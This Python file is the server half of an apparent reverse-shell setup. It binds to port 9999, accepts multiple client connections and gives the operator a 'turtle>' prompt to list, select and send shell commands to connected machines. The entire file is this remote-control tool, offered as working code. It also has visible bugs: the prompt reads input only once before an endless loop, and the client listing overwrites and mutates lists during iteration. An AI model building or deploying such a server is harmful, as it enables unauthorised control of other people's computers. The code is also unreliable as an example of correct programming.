import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []


# 1st Thread func - 1) Create Socket 2) Bind Socket 3) Accept Connections
# Create a Socket
def create_socket():
    try:
        # We will declare global var to be able to access them outside the func
        global host
        global port
        global s  # socket
        host = ""  # will pop later
        port = 9999  # we will use 9999 as it is not popular
        s = socket.socket()  # create a socket object
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind the socket
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host, port))  # .bind is a socket method thats a tuple
        s.listen(5)  # allow 5 connections
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()  # if error, try again


# Handling connection from multiple clients and saving it to a list
# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # set the socket to blocking mode prevent timeout from happening

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established | IP: " + address[0] + " | Port: " + str(address[1]))
            # handle_client_connection(conn, address)
        except:
            print("Error accepting connections")

# 2nd Thread func - 1) See all clients 2) Select client 3) Send command
# Interactive prompt for sending commands - shell named turtle
# turtle> command
# list = ID port

def start_turtle():
    cmd = input('turtle> ')
    while True:
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Invalid command")


# Display all current active connections with the client

def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"

    print("----Clients----\n" + results)

# Get target client
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")  # target is the id of the connection
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="")  # 192.168.1.1>
        return conn
    except:
        print("Selection not valid")
        return None

# Send commands to the target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input("Command> ")
            if cmd.lower() == "quit":
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(24080), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending command")
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)  # create a worker thread
        t.daemon = True  # Daemonize thread - end thread when done to save memory
        t.start()


# Do next job in queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()

        if x == 2:
            start_turtle()

        queue.task_done()


# Create Jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)  # add job to the queue
    
    queue.join()


create_workers()
create_jobs()
